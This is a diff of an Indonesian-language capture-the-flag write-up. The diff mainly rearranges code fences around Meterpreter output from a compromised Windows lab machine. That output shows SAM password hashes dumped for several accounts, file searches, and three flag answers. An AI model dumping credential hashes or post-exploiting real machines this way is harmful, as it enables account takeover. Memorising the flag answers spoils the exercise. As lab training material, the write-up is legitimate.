@@ -38,7 +38,7 @@ Langkah-langkah:
     Verifikasi Hak Akses: Memastikan sesi berjalan dengan privilese tinggi (SYSTEM).
     Pencarian File Flag: Mencari file teks di lokasi umum seperti direktori root, folder dokumen pengguna, dan folder konfigurasi sistem.
     Pengambilan Hash (Opsional): Dalam konteks simulasi, pengujian keamanan sering kali melibatkan pengambilan hash kata sandi untuk mendemonstrasikan kerentanan kredensial yang lemah.
-
+```
 Lokasi Flag yang Ditemukan:
 
 ```
@@ -49,10 +49,11 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c08
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 meterpreter > search -f flag1.txt
-
+```
 Found 1 result...
 =================
 
+```
 Path          Size (bytes)  Modified (UTC)
 ----          ------------  --------------
 c:\flag1.txt  24            2019-03-18 03:27:21 +0800
@@ -60,24 +61,29 @@ c:\flag1.txt  24            2019-03-18 03:27:21 +0800
 meterpreter > 
 meterpreter > cat "c:\\flag1.txt"
 flag{access_the_machine}meterpreter > search -f flag2.txt
+```
 Found 1 result...
 =================
 
+```
 Path                                  Size (bytes)  Modified (UTC)
 ----                                  ------------  --------------
 c:\Windows\System32\config\flag2.txt  34            2019-03-18 03:32:48 +0800
 
 meterpreter > cat "c:\\Windows\\System32\\config\\flag2.txt"
 flag{sam_database_elevated_access}meterpreter > search -f flag3.txt
+```
+
 Found 1 result...
 =================
-
+```
 Path                              Size (bytes)  Modified (UTC)
 ----                              ------------  --------------
 c:\Users\Jon\Documents\flag3.txt  37            2019-03-18 03:26:36 +0800
 
 meterpreter > cat "c:\\Users\\Jon\\Documents\\flag3.txt"
 flag{admin_documents_can_be_valuable}meterpreter > Interrupt: use the 'exit' command to quit
+```
 ```
     Flag 1: flag{access_the_machine}
     Flag 2: flag{sam_database_elevated_access}
